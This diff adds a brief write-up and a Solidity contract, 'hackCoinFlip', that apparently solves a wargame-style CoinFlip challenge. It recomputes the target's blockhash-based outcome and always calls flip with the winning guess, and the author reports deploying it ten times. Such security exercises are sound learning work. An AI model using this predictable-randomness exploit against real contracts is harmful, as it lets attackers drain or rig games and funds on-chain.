@@ -1,0 +1,21 @@
+1) I interacted with the CoinFlip contract using an external contract which
+allowed me to pick a correct guess. I deployed the contract 10 times.
+
+contract hackCoinFlip {
+    CoinFlip public coin = CoinFlip(0x63065C4049f0f7A65691930d78526F8d4877dA6a);
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+     constructor(bool _guess) public {
+     uint256 blockValue = uint256(blockhash(block.number - 1));
+      uint256 coinFlip = blockValue/(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+    if (_guess==side){
+    coin.flip(_guess);
+     
+    }
+    else{
+     coin.flip(!_guess);
+ }
+}
+
+ }
